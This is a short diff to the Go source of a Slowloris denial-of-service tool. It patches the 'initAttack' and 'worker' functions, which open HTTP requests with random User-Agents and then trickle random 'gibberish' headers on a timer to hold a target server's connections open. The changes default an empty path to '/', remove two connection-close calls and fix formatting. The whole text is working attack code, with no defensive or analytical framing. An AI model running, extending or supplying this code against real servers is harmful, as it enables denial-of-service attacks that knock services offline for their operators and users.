@@ -85,14 +85,16 @@ func (s *Slowloris) setupTCPConnIfNeeded(conn net.Conn) error {
 }
 
 func (s *Slowloris) initAttack(conn net.Conn) error {
-	startLine := fmt.Sprintf("%s %s HTTP/1.1", s.Method, s.Target.Url.Path)
+	path := s.Target.Url.Path
+	if path == "" {
+		path = "/"
+	}
+	startLine := fmt.Sprintf("%s %s HTTP/1.1", s.Method, path)
 	if err := writeHTTPLineTo(conn, startLine); err != nil {
-		_ = conn.Close()
 		return fmt.Errorf("write HTTP start line: %w", err)
 	}
 
 	if err := writeHTTPHeaderTo(conn, "User-Agent", s.UserAgents[s.randn(len(s.UserAgents))]); err != nil {
-		_ = conn.Close()
 		return fmt.Errorf("write HTTP header: %w", err)
 	}
 
@@ -141,7 +143,7 @@ func (s *Slowloris) worker(ctx context.Context) error {
 		select {
 		case <-ctx.Done():
 			return nil
-		case <- setGibberishTimer():
+		case <-setGibberishTimer():
 			k, v := gibberishValue(s.randn, 5), gibberishValue(s.randn, 5)
 			if err := writeHTTPHeaderTo(conn, k, v); err != nil {
 				return fmt.Errorf("write gibberish HTTP header: %w", err)
